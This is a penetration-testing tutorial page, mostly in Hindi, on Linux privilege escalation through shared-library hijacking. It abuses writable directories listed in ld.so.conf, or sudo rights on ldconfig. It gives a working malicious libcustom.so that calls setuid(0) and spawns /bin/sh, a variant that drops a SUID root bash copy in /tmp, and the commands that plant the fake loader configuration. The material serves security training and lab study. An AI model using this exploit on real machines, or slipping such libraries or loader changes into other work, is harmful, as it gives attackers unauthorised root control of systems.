# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## वातावरण तैयार करें

निम्नलिखित अनुभाग में आप उन फ़ाइलों का code पा सकते हैं जिनका उपयोग हम वातावरण तैयार करने के लिए करेंगे

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Create** उन फाइलों को अपनी मशीन पर उसी फोल्डर में
2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copy** `libcustom.so` को `/usr/lib` में और cache को refresh करें: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Check the environment

Check करें कि _libcustom.so_ **लोड** हो रहा है _/usr/lib_ से और कि आप binary को **execute** कर सकते हैं.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### उपयोगी triage commands

किसी real target पर attack करते समय, binary को जिस **exact library name** की ज़रूरत है उसे verify करें और loader अभी क्या **currently resolving** कर रहा है:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
कुछ उपयोगी gotchas:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` आमतौर पर **काम नहीं करता** क्योंकि
  redirection आपका current shell करता है। इसके बजाय
  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` इस्तेमाल करें।
- **SUID/privileged** binaries **secure-execution mode** में `LD_LIBRARY_PATH`/`LD_PRELOAD` को ignore करते हैं, लेकिन `/etc/ld.so.conf` से आने वाली directories अभी भी trusted loader configuration का हिस्सा होती हैं, इसलिए यह misconfiguration privileged programs को फिर भी प्रभावित कर सकती है।
- नए glibc versions में, dynamic loader `--list-diagnostics` भी expose करता है, जो cache resolution और `glibc-hwcaps` subdirectory selection debug करने में useful है, जब hijack expected तरीके से behave नहीं करता।

## Exploit

इस scenario में हम मानेंगे कि **किसी ने एक vulnerable entry बनाई है** file में _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
कमज़ोर फ़ोल्डर _/home/ubuntu/lib_ है (जहाँ हमारे पास writable access है)।\
**नीचे दिया गया code** उसी path के अंदर download और compile करें:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
यदि आप उम्मीद करते हैं कि बाद में **root** (या कोई अन्य privileged account) vulnerable binary को execute करेगा, तो आम तौर पर एक **root-owned artifact** छोड़ना बेहतर होता है बजाय एक interactive shell spawn करने के। उदाहरण के लिए:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
फिर, privileged execution होने के बाद, आप `/tmp/rootbash -p` का उपयोग कर सकते हैं।

अब जब हमने **misconfigured** path के अंदर malicious libcustom library बना ली है, हमें एक **reboot** या root user द्वारा **`ldconfig`** execute किए जाने का इंतज़ार करना होगा (_अगर आप इस binary को **sudo** के रूप में execute कर सकते हैं या इसमें **suid bit** है, तो आप इसे खुद execute कर पाएँगे_)।

एक बार यह हो जाने के बाद `sharedvuln` executable `libcustom.so` library को कहाँ से load कर रहा है, यह **recheck** करें:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
जैसा कि आप देख सकते हैं, यह इसे **`/home/ubuntu/lib`** से लोड कर रहा है और अगर कोई भी user इसे execute करता है, तो एक shell execute हो जाएगा:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> ध्यान दें कि इस उदाहरण में हमने privileges elevate नहीं किए हैं, लेकिन executed commands को modify करके और **root या किसी अन्य privileged user के vulnerable binary execute करने का इंतज़ार करके** हम privileges escalate कर पाएँगे।

### Other misconfigurations - Same vuln

पिछले उदाहरण में हमने एक ऐसी misconfiguration बनाई थी जहाँ एक administrator ने **`/etc/ld.so.conf.d/` के अंदर एक configuration file में एक non-privileged folder set किया था**।\
लेकिन ऐसी और भी misconfigurations हैं जो वही vulnerability पैदा कर सकती हैं; अगर आपके पास `/etc/ld.so.conf.d`s के अंदर किसी **config file**, `/etc/ld.so.conf.d` फ़ोल्डर, या `/etc/ld.so.conf` फ़ाइल में **write permissions** हैं, तो आप वही vulnerability configure करके उसे exploit कर सकते हैं।

## Exploit 2

**मान लीजिए आपके पास `ldconfig` पर sudo privileges हैं**।\
आप `ldconfig` को यह बता सकते हैं कि conf files कहाँ से load करनी हैं, इसलिए हम इसका फायदा उठाकर `ldconfig` से arbitrary folders load करा सकते हैं।\
तो, चलिए `/tmp` को load करने के लिए ज़रूरी files और folders बनाते हैं:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
अब, जैसा कि **previous exploit** में बताया गया है, **malicious library को `/tmp` के अंदर create करें**।\
और आखिर में, path को load करें और check करें कि binary library को कहाँ से load कर रही है:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**जैसा कि आप देख सकते हैं, `ldconfig` पर sudo privileges होने पर आप उसी vulnerability का exploit कर सकते हैं।**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
